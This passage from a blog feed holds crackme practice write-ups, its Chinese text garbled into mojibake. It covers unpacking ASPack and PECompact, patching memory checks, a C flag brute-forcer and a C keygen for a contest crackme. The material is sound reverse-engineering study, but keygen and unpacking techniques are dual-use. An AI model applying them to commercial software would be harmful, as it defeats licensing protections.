ä¸ºhWndæ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£å¥æŸ„ï¼Œæˆ‘ä»¬çœ‹ä¸ªçª—å£çš„å¥æŸ„èµ‹å€¼ç»™äº†hWndã€‚hWndæ˜¯å…¨å±€å˜é‡ã€‚</p><p>ä»äº¤å‰å¼•ç”¨æ¥åˆ°ä¸‹é¢çš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200805172125636.png" alt="image-20200805172125636"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨äº†WinClasså®šä¹‰äº†ä¸€ä¸ªçª—å£çš„ç±»ï¼Œå¯¹æ¯ä¸ªå±æ€§èµ‹å€¼åä½¿ç”¨RegisterClassWæ¥æ³¨å†Œçª—å£ï¼Œæœ€åé€šè¿‡CreatWindowExWå°†è¯¥çª—å£å®ä¾‹åŒ–ï¼Œå¹¶æ­¤çª—å£å¥æŸ„èµ‹å€¼ç»™Hwndã€‚æ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å‘é€ç»™äº†è¿™ä¸ªçª—å£ã€‚</p><p>å¦å¤–ï¼ŒWndClassä¸­çš„æˆå‘˜lpfnWndProcæŒ‡å‘ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œæ˜¯çª—ä½“çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ã€‚<strong>å®ƒæ¥å—åˆ°PostMessageWå‘é€æ¥çš„æ¶ˆæ¯åå³è°ƒç”¨ã€‚</strong></p><p>è¿›å…¥è¯¥çª—å£æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200805172955592.png" alt="image-20200805172955592"></p><p>ä»ä¸Šé¢å‡½æ•°çŸ¥é“ï¼Œè™½ç„¶ä¸çŸ¥é“è¾“å…¥çš„å…·ä½“å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å¯ä»¥çˆ†ç ´å‡ºç´¯åŠ å’Œï¼Œä¸”ä¸å¤§äº17*122 = 2074ï¼ˆå› ä¸ºè¾“å…¥å­—ç¬¦é•¿åº¦&lt;= 17ï¼‰ã€‚å¾—åˆ°ç´¯åŠ å’Œæˆ‘ä»¬å°±èƒ½çŸ¥é“ï¼Œçª—å£æ˜¾ç¤ºå‡ºçš„æ˜¯ä»€ä¹ˆå†…å®¹äº†ã€‚</p><p>å†™ç¨‹åºæ”¶å·¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xF5</span>, <span class="number">0x04</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xE9</span>, <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x04</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2074</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i&amp;<span class="number">0xf00</span>) == <span class="number">1024</span>) &amp;&amp; ((i&amp;<span class="number">0xf0</span>) == <span class="number">0xb0</span>) &amp;&amp; ((i&amp;<span class="number">6</span>) == <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">44</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[k++] = *(<span class="keyword">short</span> <span class="keyword">int</span> *)&amp;ida_chars[j]^i; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag), k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(flag, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°ï¼šå³ç¬¬ä¸€ä¸ªæ»¡è¶³ã€‚<img src="/2020/07/31/CrackMe/image-20200805173523092.png" alt="image-20200805173523092"></p><h2 id="dame"><a href="#dame" class="headerlink" title="dame"></a>dame</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªDAMNâ€™s Official joining Contestï¼ˆæ˜¯ä¸€ä¸ªæœºæ„çš„åŠ å…¥æµ‹è¯•ï¼Œå°†ç¨‹åºæŒ‡å®šç ´è§£å¹¶å†™å‡ºæ³¨å†Œæœºï¼‰</p><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog</a> æå–ç ï¼šh0z9</p><p>è¦æ±‚ï¼šå¤§æŒ‰é’®å’Œæ ‡é¢˜æ˜¾ç¤ºæœªé”å®šçš„æ¶ˆæ¯å¹¶ä¸”ç¨‹åºè¯´æŒ‰é’®è¢«æŒ‰ä¸‹æ—¶æœªé”å®šä¸æ³¨å†Œæœºçš„ç¼–å†™ã€‚<img src="/2020/07/31/CrackMe/image-20200806181244476.png" alt="image-20200806181244476"></p><p>è½½å…¥ODå‘ç°æœ‰å£³ï¼Œç›´æ¥å †æ ˆå¹³è¡¡åŸç†æŠŠå£³å¸¦èµ°ï¼Œç„¶ådumpå‡ºæ— å£³æ–‡ä»¶ã€‚</p><p>ç”±äºæˆ‘ä»¬è¦ä¿®æ”¹å¯¹è¯æ¡†æ¨¡å—ä¸Šçš„å†…å®¹ï¼Œæ‰€ä»¥é¦–å…ˆæ‰¾åˆ°åˆ›å»ºå¯¹è¯æ¡†å‡½æ•°ã€‚ODè½½å…¥åœ¨ç¨‹åºå…¥å£ç‚¹å³å¯çœ‹åˆ°ï¼šDialogBoxParamA<img src="/2020/07/31/CrackMe/image-20200806181904819.png" alt="image-20200806181904819"></p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾ä¸­çš„å¯¹è¯æ¡†è¿‡ç¨‹å‡½æ•°çš„èµ·å§‹åœ°å€ï¼š<strong>401045</strong>ï¼Œè¯¥å¤„ä»£ç å¥½åƒæ²¡æœ‰è¯†åˆ«å‡ºæ¥ï¼Œä¸”ä¸‹æ–­æœ‰æç¤ºå¹¶ä¸”æ‰§è¡Œå¾ˆå¥‡æ€ªã€‚è½½å…¥idaä¸­çœ‹çœ‹ï¼š<img src="/2020/07/31/CrackMe/image-20200806182148079.png" alt="image-20200806182148079"></p><p>æ‰€ä»¥enteråœ¨ODä¸­æ²¡æœ‰è¯†åˆ«å‡ºæ¥ï¼Œä¸”401035-401045ç¡®å®æ•°æ®ï¼Œ401049æ‰æ˜¯ä»£ç å¼€å§‹ï¼Œæ‰€ä»¥è¿”å›ODè¿›è¡Œå¤„ç†ï¼Œæ³¨æ„ä¸èƒ½nopï¼Œå› ä¸ºæ•°æ®åœ¨åé¢æœ‰ä½¿ç”¨åˆ°ï¼Œç›´æ¥ä¸‹æ–­401049ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œä¸æ–­å•æ­¥è°ƒè¯•çŸ¥é“ï¼ŒDialogProcå‡½æ•°æ ¹æ®ä¸åŒçš„æ¶ˆæ¯åšå‡ºç›¸åº”çš„å“åº”ã€‚é¦–å…ˆåˆ›å»ºæ•´ä¸ªå¯¹è¯æ¡†æ¨¡æ¿ï¼Œç„¶åä¸æ–­è½½å…¥å„ç§æ§ä»¶ã€‚<img src="/2020/07/31/CrackMe/image-20200806182822916.png" alt="image-20200806182822916"></p><p>ODè°ƒè¯•åï¼Œåœ¨IDAä¸­çœ‹æŒ‡å®šä»£ç æ®µï¼šå¯ä»¥çœ‹åˆ°dword_402313å¤„çš„å€¼å†³å®šäº†æ§ä»¶çš„æ˜¾ç¤ºå†…å®¹å’Œæ ·å¼ã€‚<img src="/2020/07/31/CrackMe/image-20200806183539623.png" alt="image-20200806183539623"></p><p>æ‰¾åˆ°dword_402313èµ‹å€¼å¤„ï¼šæ˜¯å¯¹ç¨‹åºéƒ¨åˆ†çš„ä»£ç çš„æ ¡éªŒï¼Œæ£€æµ‹æ˜¯å¦ä¸‹æ–­ç‚¹ã€‚<img src="/2020/07/31/CrackMe/image-20200806183725134.png" alt="image-20200806183725134"></p><p>è™½ç„¶çŸ¥é“äº†dowrd_402313å¤„çš„å€¼å½±å“å¯¹è¯æ¡†çš„æ˜¾ç¤ºï¼Œä½†æ˜¯ä»€ä¹ˆæ ·çš„å€¼æ‰èƒ½è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„å‘¢ï¼Œå›åˆ°ODåŠ¨è°ƒã€‚<img src="/2020/07/31/CrackMe/image-20200806185407720.png" alt="image-20200806185407720"></p><p>ç”±äºç¨‹åºä¸­å­˜åœ¨ä»£ç æ ¡éªŒï¼Œå¤šæ¬¡è°ƒè¯•å‘ç°ï¼Œå½“ä¸‹æ–­å[402313] = 1ï¼Œä¸ºä¸‹æ–­ç‚¹[402313] = 0ã€‚ ç»§ç»­è°ƒè¯•ï¼š<img src="/2020/07/31/CrackMe/image-20200806185813389.png" alt="image-20200806185813389"></p><p>åˆ°è¿™é‡Œå°±æ¸…æ¥šäº†ï¼Œ[402313]çš„å€¼è¿˜å†³å®šäº†æ˜¾ç¤ºå­—ç¬¦ä¸²çš„åç§»ä½ç½®ï¼Œå½“[402313] = 1æ—¶ï¼Œå­—ç¬¦ä¸²ä¸ºï¼šDAMNâ€™s TryMe -CRACKED! è€Œå®ƒåé¢ä¸€ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ï¼šUNLOCKEDï¼æ‰€ä»¥æ¨å‡ºï¼š[402313]çš„å€¼è¦ç­‰äº2ã€‚</p><p>é‡æ–°è½½å…¥ï¼Œæ‰¾åˆ°åˆé€‚ä½ç½®åœ¨å†…å­˜çª—å£ä¿®æ”¹[402313]çš„å€¼ä¸º2ï¼Œç„¶åè¿è¡Œã€‚<img src="/2020/07/31/CrackMe/image-20200806190419665.png" alt="image-20200806190419665"></p><p>å¯¹è¯æ¡†å¼¹å‡ºçš„å†…å®¹ä»ç„¶ä¸æ˜¯UNLOCKEDï¼idaä¸­ODéƒ½å¯ä»¥æ‰¾åˆ°MessageBoxAçœ‹ä¸€ä¸‹ã€‚è¿™é‡Œä½¿ç”¨ODï¼š<img src="/2020/07/31/CrackMe/image-20200806190848568.png" alt="image-20200806190848568"></p><p>ä»ä¸Šé¢çœ‹åˆ°ï¼Œ[402308]çš„å€¼ä¼šå†³å®šå¯¹ä¸å¯¹[402313]çš„å€¼ä¿®æ”¹ï¼Œæ‰€ä»¥å¯¹[402308]çš„å€¼ä¿®æ”¹ï¼šæˆåŠŸã€‚æœ€åè¦è®©ç¨‹åºä¹‹åä¹Ÿå¯ä»¥è¿™æ ·è¿è¡Œï¼Œç®€å•çš„patchä¸€ä¸‹å³å¯ã€‚</p><p>ä¸‹é¢å¼€å§‹æ‰¾æ³¨å†Œç®—æ³•ï¼Œç–‘æƒ‘çš„æ˜¯RegisteræŒ‰é’®ä¸ºä»€ä¹ˆä¸èƒ½ç‚¹å‡»ï¼Ÿéš¾é“è¿˜è¦å¯¹ç¨‹åºæ‰“è¡¥ä¸ä»€ä¹ˆçš„ï¼Œä¸ç†Ÿæ‚‰Win32ç¼–ç¨‹è„‘å­è¿˜æ˜¯ä¸€ç‰‡ç©ºç™½ã€‚</p><p>ä½†æ˜¯æœºç¼˜å·§åˆä¸‹ï¼Œè®©æˆ‘æ‰¾åˆ°äº†è¿™é‡Œé¢çš„ç„æœºã€‚åœ¨ODä¸­æ‰¾åˆ°è·å–æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„å‡½æ•°åï¼Œæ¡ä»¶åå°„ä¸‹äº†æ–­ã€‚éšä¾¿ç‚¹å‡»äº†ä¸‹ç¨‹åºçš„è¾“å…¥æ–‡æœ¬æ¡†ï¼Œç¨‹åºçªç„¶åœ¨ODä¸­æ–­äº†ä¸‹æ¥ã€‚ã€‚ä¸”çœ‹åˆ°ä¸‹é¢çš„ä¸€ä¸ª<strong>EnableWindow</strong>å‡½æ•°ï¼Œç™¾åº¦ä¸‹åŠŸèƒ½ï¼šè®¾ç½®çª—å£çš„å¯ç”¨æ€§ï¼Œå³æˆ‘ä»¬ç¨‹åºçš„ResiteræŒ‰é’®æ˜¯å¦å¯ç”¨ã€‚<img src="/2020/07/31/CrackMe/image-20200806193140672.png" alt="image-20200806193140672"></p><p>å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°ç¬¬ä¸€ä¸ªGetDlgItemTextAæ˜¯è·å–nameå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªè·å–keyã€‚ä¸”æ¯è¾“å…¥ä¸€ä¸ªnameå­—ç¬¦å°±è°ƒç”¨ä¸€æ¬¡ç¬¬ä¸€ä¸ªGetDlgItemTextAå‡½æ•°å°†è¯¥å­—ç¬¦å­˜å…¥æŒ‡å®šçš„å†…å­˜åŒºåŸŸï¼Œè¿”å›å­—ç¬¦é•¿åº¦ï¼›æ¯è¾“å…¥ä¸€ä¸ªkeyå°±è°ƒç”¨ç¬¬äºŒä¸ªGetDlgItemTextAå‡½æ•°å°†å…¶å­˜å…¥æŒ‡å®šå†…å­˜åŒºåŸŸï¼Œè¿”å›å­—ç¬¦é•¿åº¦ï¼Œå¹¶è°ƒç”¨<strong>004012F3</strong>å‡½æ•°ï¼ˆåº”è¯¥æ˜¯nameä¸keyçš„éªŒè¯è¿‡ç¨‹ï¼‰ï¼Œæœ€åé€šè¿‡<strong>004012F3</strong>å‡½æ•°çš„è¿”å›å€¼æ¥æ‰§è¡Œ<strong>EnableWindow</strong>å‡½æ•°ï¼Œä»¥æ­¤å†³å®š<strong>Register</strong>æŒ‰é’®çš„æŒ‰é’®æ˜¯å¦å¯ç”¨ã€‚</p><p>è¾“å…¥æ•°æ®ï¼Œä¸‹æ–­004012F3å¹¶è¿›å…¥ï¼š<img src="/2020/07/31/CrackMe/image-20200806233948875.png" alt="image-20200806233948875"></p><p>åˆ°æ­¤ï¼Œç»“æŸå¯¹ç¨‹åºçš„åˆ†æã€‚æœ€åå°†æ¯ä¸ªåå…­è¿›åˆ¶æ•°è½¬åŒ–ä¸ºå¯¹åº”çš„å­—ç¬¦çš„æ±‡ç¼–æŒ‡ä»¤è¿˜è¦å¤šçœ‹çœ‹ï¼š<code>sbb al, 69ï¼›dasï¼›</code>ã€‚è¿™é‡Œal = 0xEï¼Œsbbå¸¦å€Ÿä½å‡æ³•åï¼šal = al-0x69-CF = 0xAEã€‚</p><blockquote><p>dasï¼šç»„åˆ(å‹ç¼©)BCDç çš„åŠ æ³•è°ƒæ•´æŒ‡ä»¤ã€‚<strong>åŠŸèƒ½ï¼šå¦‚æœALä½å››ä½&gt;9æˆ–AF=1 ï¼Œåˆ™ALçš„å€¼å‡06hï¼Œå¹¶ç½®AF=1ï¼›å¦‚æœALé«˜å››ä½&gt;9æˆ–CF=1 ï¼Œåˆ™ALçš„å€¼å‡60h ,ä¸”ç½®CF=1ï¼›</strong></p></blockquote><p>æ‰€ä»¥è¿™é‡Œï¼šal = al-0x60 = 0x45ã€‚<strong>è€Œ0x45å°±æ˜¯â€™Eâ€™å­—ç¬¦çš„ASCIIã€‚</strong></p><p>æœ€åCè¯­è¨€ç®€å•å†™ä¸ªæ³¨å†Œæœºç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0x44414D4E</span>, i = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"nameï¼š"</span>);</span><br><span class="line">gets(name);</span><br><span class="line"><span class="keyword">while</span>(name[i])</span><br><span class="line">&#123;</span><br><span class="line">temp += name[i];</span><br><span class="line">ans = ((ans &gt;&gt; <span class="number">1</span>) | ((ans&amp;<span class="number">1</span>) &lt;&lt; <span class="number">31</span>));</span><br><span class="line">ans = ((ans &gt;&gt; i) | ((ans&amp;((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>, i)<span class="number">-1</span>))) &lt;&lt; <span class="number">32</span>-i));</span><br><span class="line">ans ^= temp;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ans |= <span class="number">0x10101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è·ƒè·ƒæ¬²è¯•"><a href="#è·ƒè·ƒæ¬²è¯•" class="headerlink" title="è·ƒè·ƒæ¬²è¯•"></a>è·ƒè·ƒæ¬²è¯•</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>é¢˜ç›®åŠ äº†Aspackå£³ï¼Œç›´æ¥ODä¸­å †æ ˆå¹³è¡¡åŸç†è„±å£³ã€‚</p><p>æ‰¾åˆ°è·å–ç”¨æˆ·è¾“å…¥ä¿¡æ¯çš„APIï¼Œæ¥åˆ°éªŒè¯è¿‡ç¨‹ï¼šé¦–å…ˆæ˜¯ä¸‹æ–­ç‚¹çš„4ä¸ªå‡½æ•°å¯¹email_addresséªŒè¯ã€‚<img src="/2020/07/31/CrackMe/image-20200810111355447.png" alt="image-20200810111355447"></p><p>åŠ¨æ€å¾ˆå¤šæ¬¡ï¼Œå§‹ç»ˆæ²¡è°ƒå‡ºè¿™å‡ ä¸ªå‡½æ•°çš„åŠŸèƒ½ä¸”ä»£ç é€»è¾‘ä¹Ÿå¥‡æ€ªã€‚ã€‚ã€‚</p><p>é¢˜ç›®çš„è¦æ±‚åªè¦åé¢serialï¼Œæˆ–è®¸serialä¸email_addressä¸serialæ²¡æœ‰å…³ç³»ï¼Œå¹²è„†ç›´æ¥è·³è¿‡email_addreeè®¾ç½®æ–°çš„EIPï¼Œæ¥åˆ°éªŒè¯serialå¤„ï¼š<img src="/2020/07/31/CrackMe/image-20200810111950081.png" alt="image-20200810111950081"></p><p>æœç„¶ï¼Œserialä¸email_addressæ²¡æœ‰å…³ç³»ï¼Œserialçš„éªŒè¯ä¹Ÿåªæ˜¯ç®€å•çš„åŠ å‡æ³•ã€‚å°±æ˜¯æ•´ç†èµ·æ¥æœ‰ç‚¹éº»çƒ¦ã€‚</p><p>æœ€åè½½å…¥IDAçœ‹çœ‹ä¼ªä»£ç å‘¢ã€‚åŸæ¥æ˜¯Cæ ‡å‡†åº“é‡ŒæŸ¥æ‰¾å­å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚<img src="/2020/07/31/CrackMe/image-20200810112350707.png" alt="image-20200810112350707"></p><h2 id="ä¸€çŸ¥åŠè§£"><a href="#ä¸€çŸ¥åŠè§£" class="headerlink" title="ä¸€çŸ¥åŠè§£"></a>ä¸€çŸ¥åŠè§£</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>ä»è¿™ä¸ªCMè®¤è¯†äº†ä¸€ä¸ªæ–°å£³ï¼šPEcompact</p><p>è½½å…¥ODä»ç„¶ä½¿ç”¨å †æ ˆå¹³è¡¡åŸç†è„±å£³ï¼Œä½†å¯¹è¿™ä¸ªå£³å¥½åƒä¸é€‚ç”¨ã€‚ã€‚ã€‚è®¤ä¸ºè‡ªå·±æ‰¾åˆ°äº†OEPï¼Œdumpåå‘ç°æ‰“ä¸å¼€ã€‚</p><p>æ¥åˆ°çœ‹é›ªè®ºå›æ‰¾å¸ˆå‚…ä»¬è„±è¿™ä¸ªå£³çš„æ–¹æ³•ï¼Œå…ˆæ˜¯ä½¿ç”¨äº†<a href="https://bbs.pediy.com/user-24467.htm" target="_blank" rel="noopener">CCDebuger</a>å¤§å¸ˆå‚…çš„è„±å£³è„šæœ¬ï¼ŒçœŸçš„æ˜¯å¼ºï¼Œç®—æ˜¯è„±å£³æœºäº†ã€‚è„±å£³åå‘ç°å’Œæˆ‘æ‰¾åˆ°çš„OEPæ˜¯ä¸€æ ·ï¼Œé‚£æˆ‘çš„åº”è¯¥æ˜¯æ²¡æœ‰ä¿®å¤è¾“å…¥è¡¨å¯¼è‡´æ‰“ä¸å¼€ã€‚</p><p>åé¢åˆçœ‹åˆ°äº†ä¸€ä½å¸ˆå‚…è„±è¿™ä¸ªå£³çš„å¸–å­ï¼Œé‡Œé¢è¿™æ ·è¯´é“ï¼š</p><blockquote><p><strong>å¤–å£³å®Œæ•´åœ°ä¿ç•™äº†è¾“å…¥è¡¨ï¼Œå¤–å£³åŠ è½½æ—¶æ²¡æœ‰å¯¹IATåŠ å¯†ï¼›å¤–å£³è§£å‹æ•°æ®æ—¶ï¼Œå®Œæ•´çš„è¾“å…¥è¡¨ä¼šåœ¨å†…å­˜ä¸­å‡ºç°ï¼Œç„¶åå¤–å£³ç”¨æ˜¾ç¤ºåŠ è½½DLLçš„æ–¹å¼è·å¾—å„ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†è¯¥åœ°å€å¡«å……åˆ°IATä¸­ã€‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘å›åˆ°ODæ¢äº†ç¬¬äºŒä¸ªdumpçš„æ–¹å¼ï¼š<img src="/2020/07/31/CrackMe/image-20200811111903851.png" alt="image-20200811111903851"></p><p>å“ˆå“ˆï¼Œè¿˜æ²¡æœ‰ç”¨importRecå°±èƒ½æˆåŠŸæ‰“å¼€ï¼Œåªä¸è¿‡è¿™ä¸ªä¹Ÿçœ‹æƒ…å†µã€‚</p><p>å¦å¤–è®°å½•ä¸€ä¸‹ç”¨espå®šå¾‹è„±è¿™ä¸ªå£³ä¸ä¸€æ ·çš„åœ°æ–¹ï¼šé¦–å…ˆä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹ã€‚<img src="/2020/07/31/CrackMe/image-20200811112234416.png" alt="image-20200811112234416"></p><p>F9åï¼Œæ–­åœ¨ç¨‹åºçš„é¢†ç©ºï¼šå¯ä»¥çœ‹åˆ°å¹¶ä¸æ˜¯ä»å †æ ˆpopå‡ºä¸‹æ–­çš„æ•°æ®æ–­ä¸‹çš„ï¼Œæ‰€ä»¥ç»§ç»­F9ã€‚<img src="/2020/07/31/CrackMe/image-20200811112818716.png" alt="image-20200811112818716"></p><p>åé¢é‡åˆ°åŒä¸Šå¤„ç†ï¼Œç›´åˆ°çœ‹åˆ°å¯¹å †æ ˆè®¿é—®ã€‚ä¸ä¹…çœ‹åˆ°æ¥åˆ°OEPæ ‡å¿—ã€‚<img src="/2020/07/31/CrackMe/image-20200811113028787.png" alt="image-20200811113028787"></p><p>æœ€åï¼Œç¨‹åºçš„é€†å‘å¾ˆç®€å•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬å¸–ä¸»è¦å¯¹ç»ƒä¹ Crackmeçš„çŸ¥è¯†ç‚¹ä¸çªç ´ç‚¹è¿›è¡Œè®°å½•ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CrackMe" scheme="https://www.Bxnop.cn/categories/CrackMe/"/>
    
    
      <category term="ç ´è§£" scheme="https://www.Bxnop.cn/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
